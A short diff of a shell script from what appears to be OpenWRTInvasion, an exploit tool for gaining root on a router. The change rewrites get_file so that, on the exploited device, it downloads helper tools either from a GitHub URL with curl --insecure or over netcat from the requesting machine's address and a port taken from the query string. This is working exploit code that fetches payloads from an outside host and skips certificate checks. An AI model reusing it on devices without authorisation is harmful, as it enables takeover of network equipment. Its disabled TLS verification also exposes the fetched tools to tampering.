@@ -11,9 +11,27 @@ exploit() {
     echo "Done exploiting"
 }
 
-get_file() {
-    rm -rf "$2"
+download_file_from_github() {
+    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
+    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/$1" --insecure --output "$2"
+}
+
+download_file_from_tcp_server() {
     echo "$1" | nc "${REMOTE_ADDR}" "${QUERY_STRING}" >"$2"
+}
+
+get_file() {
+    src_file="$1"
+    dst_file="$2"
+
+    rm -rf "${dst_file}"
+
+    port="${QUERY_STRING}"
+    if [ x"${port}" = x0 ]; then
+        download_file_from_github "${src_file}" "${dst_file}"
+    else
+        download_file_from_tcp_server "${src_file}" "${dst_file}"
+    fi
 }
 
 setup_password() {
